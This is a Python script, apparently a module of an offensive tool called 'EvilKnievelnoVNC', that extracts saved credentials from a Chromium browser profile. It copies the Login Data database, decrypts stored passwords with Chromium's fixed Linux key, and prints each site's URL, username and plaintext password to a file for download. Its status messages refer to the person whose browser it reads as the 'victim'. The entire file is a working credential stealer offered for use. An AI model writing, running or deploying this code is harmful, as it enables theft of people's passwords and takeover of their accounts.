#!/usr/bin/env python3
"""
passwords.py — Chrome/Chromium saved-credential extractor for EvilKnievelnoVNC

On Linux without GNOME keyring, Chromium encrypts saved passwords with the
same AES-CBC scheme used for cookies: PBKDF2('peanuts', 'saltysalt', 1, 16).

Copies Login Data + WAL to a temp dir before reading (same WAL checkpoint
technique as cookies.py) to avoid lock contention with running Chromium.

Output:
  stdout → human-readable dump (server.sh redirects to Downloads/passwords.txt)
"""

import os
import sys
import sqlite3
import shutil
import tempfile
from datetime import datetime, timedelta

try:
    from Crypto.Cipher import AES
    from Crypto.Protocol.KDF import PBKDF2
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

CHROME_PROFILE = "/home/user/Chrome/Default"
LOGIN_DB       = os.path.join(CHROME_PROFILE, "Login Data")


def chrome_time(ts):
    if ts and ts != 86400000000:
        try:
            return str(datetime(1601, 1, 1) + timedelta(microseconds=ts))
        except Exception:
            pass
    return ""


def decrypt(enc):
    if not HAS_CRYPTO:
        return "[pycryptodome not installed]"
    if not isinstance(enc, (bytes, bytearray)) or len(enc) < 4:
        return ""
    try:
        if enc[:3] == b'v10':
            enc   = enc[3:]
            key   = PBKDF2(b'peanuts', b'saltysalt', 16, 1)
            raw   = AES.new(key, AES.MODE_CBC, b' ' * 16).decrypt(enc)
            pad   = raw[-1]
            if 1 <= pad <= 16:
                return raw[:-pad].decode('utf-8', errors='replace')
    except Exception as e:
        return f"[decrypt error: {e}]"
    return enc.decode('utf-8', errors='replace')


def copy_db(src):
    tmp = tempfile.mkdtemp(prefix="ekv_logins_")
    dst = os.path.join(tmp, "LoginData")
    shutil.copy2(src, dst)
    for ext in ("-wal", "-shm"):
        sidecar = src + ext
        if os.path.exists(sidecar):
            shutil.copy2(sidecar, dst + ext)
    return tmp, dst


def main():
    if not os.path.exists(LOGIN_DB):
        print("[!] Login Data DB not found yet — victim has not triggered credential save")
        sys.exit(0)

    tmp_dir = None
    try:
        tmp_dir, tmp_db = copy_db(LOGIN_DB)
        db  = sqlite3.connect(tmp_db)
        cur = db.cursor()
        cur.execute("""
            SELECT origin_url, action_url,
                   username_element, username_value,
                   password_element, password_value,
                   date_created, date_last_used, times_used
            FROM logins
            ORDER BY date_last_used DESC
        """)
        rows = cur.fetchall()
        db.close()

    except Exception as e:
        print(f"[!] Login Data error: {e}")
        sys.exit(1)
    finally:
        if tmp_dir:
            shutil.rmtree(tmp_dir, ignore_errors=True)

    now = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
    lines = [
        f"[*] EvilKnievelnoVNC — Saved Passwords — {now}",
        f"[*] Total saved credentials: {len(rows)}",
        "=" * 70,
    ]

    if not rows:
        lines.append("[*] No saved passwords yet (victim may not have used 'Save password')")
    else:
        for (origin_url, action_url,
             uname_elem, username,
             pass_elem, enc_pass,
             created, last_used, times_used) in rows:

            password = ""
            if isinstance(enc_pass, (bytes, bytearray)) and len(enc_pass) > 3:
                password = decrypt(enc_pass)
            elif enc_pass:
                password = str(enc_pass)

            lines += [
                f"URL:        {origin_url}",
                f"Action URL: {action_url}",
                f"Username:   {username}",
                f"Password:   {password}",
                f"Created:    {chrome_time(created)}",
                f"Last used:  {chrome_time(last_used)}",
                f"Used:       {times_used} time(s)",
                "-" * 70,
            ]

    print("\n".join(lines))


if __name__ == "__main__":
    main()
